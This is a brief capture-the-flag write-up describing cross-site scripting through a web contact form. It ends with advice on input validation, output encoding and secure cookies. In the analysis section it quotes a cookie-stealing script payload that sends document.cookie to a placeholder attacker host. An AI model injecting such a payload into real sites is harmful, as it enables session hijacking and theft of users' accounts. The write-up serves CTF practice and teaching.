Title: Cross-Site Scripting (XSS) Attack via Contact Form
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: session cookie, payload, input validation, output encoding controls, secure cookies, sensitive information

#overview
During a CTF competition, I encountered a web application that allowed users to contact the website administrators via a contact form. Suspecting the application to be vulnerable to Cross-Site Scripting (XSS), I crafted a malicious payload to test for the vulnerability.

#analysis
To test for XSS, I submitted a payload containing a script that would steal the victim's session cookie, such as <script>new Image().src="http://attacker.com/cookie?="+document.cookie;</script>, to the application's contact form. The payload executed successfully, confirming the XSS vulnerability. 

#attack_execution
To obtain the flag for the Web Exploitation challenge, I crafted a payload containing a script that would display the flag and submitted it to the application's contact form. The server recognized the payload and responded with the flag.

This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using secure cookies, and validating user input. By exploiting the vulnerability, I was able to steal sensitive information, execute malicious code, and complete the Web Exploitation challenge.
